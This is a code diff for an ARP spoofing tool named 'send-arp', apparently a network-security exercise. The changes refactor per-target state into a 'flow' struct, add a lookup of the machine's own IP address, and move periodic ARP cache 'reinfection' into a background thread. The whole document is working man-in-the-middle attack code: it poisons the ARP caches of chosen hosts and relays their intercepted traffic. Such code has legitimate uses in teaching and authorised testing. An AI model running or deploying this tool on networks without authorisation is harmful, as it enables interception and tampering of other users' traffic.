@@ -12,7 +12,7 @@
 #include "iphdr.h"
 
 uint8_t my_mac[6];
-uint32_t my_ip;
+Ip my_ip;
 
 void debug(int a)
 {
@@ -35,16 +35,32 @@ struct EthIpPacket final
 };
 #pragma pack(pop)
 
+struct flow 
+{
+	Ip sender_ip;
+	Ip receiver_ip;
+	Mac sender_mac;
+	Mac receiver_mac;
+};
+
+struct threadarg
+{
+	int count;
+	pcap_t* handle;
+	struct flow* flows;
+};
+
 void usage() 
 {
 	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
 	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
 }
 
-int GetMacAddr(const char* interface, uint8_t* my_mac)
+int GetAddrs(const char* interface, uint8_t* my_mac, Ip* my_ip)
 {
 	struct ifreq ifr;
 	int sockfd, ret;
+	char ipstr[30] = {0};
 
 	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
 	if(sockfd < 0){
@@ -60,6 +76,15 @@ int GetMacAddr(const char* interface, uint8_t* my_mac)
 		return -1;
 	}
 	memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6); // mac addr len = 6
+
+	ret = ioctl(sockfd, SIOCGIFADDR, &ifr);
+	if(ret < 0){
+		printf("ioctl() FAILED\n");
+		close(sockfd);
+		return -1;
+	}
+	inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr, sizeof(struct sockaddr));
+	*my_ip = Ip(ipstr);
 	close(sockfd);
 
 	return 0;
@@ -156,6 +181,17 @@ void relay (pcap_t* handle, PEthHdr ethernet_hdr, PIpHdr ip_hdr, Mac receiver_ma
 	}		
 }
 
+void periodic_infection(void* thread_arg)
+{
+	threadarg* arg = (threadarg*)thread_arg;
+	while(true) {
+		sleep(10);
+		for (int i = 0; i < arg->count; i++){
+		reply(arg->handle, arg->flows[i].sender_ip, arg->flows[i].receiver_ip, arg->flows[i].sender_mac); //reinfection
+		}
+	}	
+}
+
 
 int main (int argc, char* argv[])
 {
@@ -165,15 +201,11 @@ int main (int argc, char* argv[])
 		return -1;
 	}
 	char* dev = argv[1]; // interface name
-    printf("%s\n", dev);
-	GetMacAddr(dev, my_mac); // get my mac
+	GetAddrs(dev, my_mac, &my_ip); // get my mac & ip addr 
 
     /* resources */
     unsigned int count = argc / 2 - 1;
-    Ip sender_ip[count];
-    Ip receiver_ip[count];
-    Mac sender_mac[count]; 
-    Mac receiver_mac[count];
+    struct flow flows[count];
     char errbuf[PCAP_ERRBUF_SIZE];
 
     pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
@@ -184,9 +216,9 @@ int main (int argc, char* argv[])
 
     /* initialize */
     for (int i = 0; i < count; i++){
-        sender_ip[i] = Ip((const char*)argv[2 * (i + 1)]);
-        receiver_ip[i] = Ip((const char*)argv[2 * (i + 1) + 1]);
-        broadcast(handle, receiver_ip[i], &receiver_mac[i]); // get receiver`s mac
+        flows[i].sender_ip = Ip((const char*)argv[2 * (i + 1)]);
+        flows[i].receiver_ip = Ip((const char*)argv[2 * (i + 1) + 1]);
+        broadcast(handle, flows[i].receiver_ip, &flows[i].receiver_mac); // get receiver`s mac
     }
 
     unsigned int res = 0;
@@ -198,11 +230,21 @@ int main (int argc, char* argv[])
 
     /* sender  infection */
     for (int i = 0; i < count; i++){
-        infection(handle, sender_ip[i], receiver_ip[i], &sender_mac[i]);
+        infection(handle, flows[i].sender_ip, flows[i].receiver_ip, &flows[i].sender_mac);
     }
-    /* relay packet */
-    time_t start_sec = time(NULL);
-    uint64_t check = 0;
+    
+	/* periodic reinfection */
+    pthread_t thread_t;
+	struct threadarg thread_arg;
+	thread_arg.count = count;
+	thread_arg.handle = handle;
+	thread_arg.flows = flows;
+	if (pthread_create(&thread_t, NULL, (void* (*)(void*))periodic_infection, (void*)&thread_arg)) {
+    	perror("thread create error:");
+    	exit(0);
+	}
+
+	/* relay packet */
     while (true) {
         res = pcap_next_ex(handle, &header, &packet);
 		if (res == 0) continue;
@@ -215,12 +257,12 @@ int main (int argc, char* argv[])
         if (eth_type == EthHdr::Ip4){ // ipv4
 			ip_hdr = (PIpHdr)(packet + sizeof(struct EthHdr)); // Get Ip header 
             for (int i = 0; i < count; i++) {
-                if (ip_hdr->sip() == sender_ip[i] && ip_hdr->dip() != Ip(my_ip)) {
-                    relay(handle, ethernet_hdr, ip_hdr, receiver_mac[i]); // relay packet
+                if (ip_hdr->sip() == flows[i].sender_ip && ip_hdr->dip() != Ip(my_ip)) {
+                    relay(handle, ethernet_hdr, ip_hdr, flows[i].receiver_mac); // relay packet
                     break;
                 }
-				else if (ip_hdr->dip() == sender_ip[i] && ip_hdr->sip() != receiver_ip[i]) { 
-					relay(handle, ethernet_hdr, ip_hdr, sender_mac[i]); // relay packet
+				else if (ip_hdr->dip() == flows[i].sender_ip && ip_hdr->sip() != flows[i].receiver_ip) { 
+					relay(handle, ethernet_hdr, ip_hdr, flows[i].sender_mac); // relay packet
                     break;
 				}
             }
@@ -228,24 +270,18 @@ int main (int argc, char* argv[])
         else if (eth_type == EthHdr::Arp) { // arp
             arp_hdr = (PArpHdr)(packet + sizeof(struct EthHdr)); // Get ARP header
             for (int i = 0; i < count; i++) {
-                if ((arp_hdr->sip() == sender_ip[i] && arp_hdr->tip() == receiver_ip[i]) || \
-                    (arp_hdr->sip() == receiver_ip[i])){
-                    reply(handle, sender_ip[i], receiver_ip[i], sender_mac[i]); //reinfection
+                if ((arp_hdr->sip() == flows[i].sender_ip && arp_hdr->tip() == flows[i].receiver_ip) || \
+                    (arp_hdr->sip() == flows[i].receiver_ip)){
+                    reply(handle, flows[i].sender_ip, flows[i].receiver_ip, flows[i].sender_mac); //reinfection
                 }
             }
         }
-
-        /* periodic re-infection */
-        time_t current_sec = time(NULL);
-        check = current_sec - start_sec;
-        if (check >= 10){
-            for (int i = 0; i < count ; i++) {
-                reply(handle, sender_ip[i], receiver_ip[i], sender_mac[i]); //reinfection
-            }
-            start_sec = current_sec;
-        }
     }
 
+	if(pthread_join(thread_t, 0)){
+			perror("thread join error:");
+    		exit(0);
+	}
     /* return handle */
     pcap_close(handle);
 }
